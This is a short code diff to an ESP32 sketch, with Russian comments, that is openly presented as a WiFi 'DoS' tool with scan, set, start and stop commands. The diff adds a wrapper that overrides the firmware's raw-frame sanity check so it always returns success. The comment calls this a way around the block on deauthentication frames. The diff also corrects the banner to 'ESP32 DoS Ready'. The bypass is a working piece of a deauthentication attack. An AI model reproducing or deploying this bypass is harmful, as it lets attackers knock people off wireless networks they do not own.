@@ -1,9 +1,13 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 
-// Прототипы функций (объявления)
-void scanNetworks();
-void sendDeauthPacket();
+// ========== ОБЁРТКА ДЛЯ ОБХОДА БЛОКИРОВКИ DEAUTH ==========
+extern "C" {
+  int __wrap_ieee80211_raw_frame_sanity_check(int ifx, const void *buffer, int len, bool auto_seq) {
+    return 0;  // Всегда говорим "пакет разрешён"
+  }
+}
+// ============================================================
 
 struct AccessPoint {
   String ssid;
@@ -40,7 +44,7 @@ void setup() {
   esp_wifi_set_promiscuous(true);
   delay(100);
 
-  Serial.println("\n[#] ESP32 DoS Re33");
+  Serial.println("\n[#] ESP32 DoS Ready");
   Serial.println("Commands: scan, set <num>, start, stop");
 }
 
